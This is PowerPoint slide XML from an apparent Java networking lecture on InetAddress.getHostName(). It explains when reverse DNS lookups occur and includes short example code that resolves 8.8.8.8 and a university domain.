              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If reverse DNS is configured → Returns the hostname (e.g., "google.com").</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If no reverse DNS → Returns the IP address as a string (e.g., "142.250.190.46").</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="228600"/>
            <a:ext cx="11353800" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(): Returns the hostname (performs reverse DNS if needed).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="325966" y="3075497"/>
            <a:ext cx="11408834" cy="3323987"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>java.net.InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>HostnameLookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>    public static void main(String[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>) throws Exception {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress.getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>("8.8.8.8"); // Google DNS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        String hostname = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip.getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>("IP: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip.getHostAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>());</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>("Hostname: " + hostname);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress.getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>("192.168.1.100"); // Likely no reverse DNS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>(("Hostname: "  + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip.getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>()); // Returns "192.168.1.100"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>Output:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>IP: 8.8.8.8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>Hostname: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>dns.google</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>Hostname: 192.168.1.100</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400"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76200" y="753245"/>
            <a:ext cx="12039599" cy="511415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zh-CN" sz="2400" dirty="0"/>
              <a:t>The getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>method can get the domain name of the remote host, and can also get the local host name, as defined below:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>There are three ways to create an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>object. The value returned by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>is different.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the getLocalHost </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>method to create an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>object: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>returns the local host name.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="20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GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Use the domain name to create an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>object: After calling the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getAllByName methods </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>with the domain name as the parameter, the system will automatically remember the domain name. When calling the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>method, there is no need to access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>the DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>server, but the domain name is directly returned.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="533400" y="1600200"/>
            <a:ext cx="3810000" cy="3397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dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public String getHostName()</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1676399" y="3637348"/>
            <a:ext cx="8686800" cy="584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dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress address = InetAddress.getLocalHost();</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println(address.getHostName()); // </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Output the host name</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="182033" y="6054235"/>
            <a:ext cx="11324167" cy="52322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400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress address = InetAddress.getByName("www.szu.edu.cn");</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println(address.getHostName()); // </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>No need to access the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>server, directly return the domain name</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="114299" y="168470"/>
            <a:ext cx="11811000" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>method to obtain the domain name</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="32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304801" y="753245"/>
            <a:ext cx="11620498" cy="556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zh-CN" sz="2000" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>Create an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>InetAddress object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>an IP address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>When creating an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>InetAddress object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>an IP address ( getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>getAllByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>getByAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>methods can all create </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>InetAddress objects using an IP address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>), there is no need to access the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>server. The work of looking up the domain name through </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>the DNS server is done by the getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>method. If the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>address does not exist or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>the DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>server does not allow mapping between </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>addresses and domain names, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>the getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>method directly returns the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>address.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="18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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>Summary: In the three methods, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>the DNS server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>is accessed only when the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>getHostName method </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>is called by using the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>InetAddress object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>created by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>the IP address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>. In other cases, the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>method does not access the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>server, but directly returns the domain name or local name.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="18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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>The following code demonstrates how to use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>method in different situations and calculates the number of milliseconds required for each situation.</a:t>
            </a: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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1771650" y="2644170"/>
            <a:ext cx="8686800" cy="156966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dirty="0">
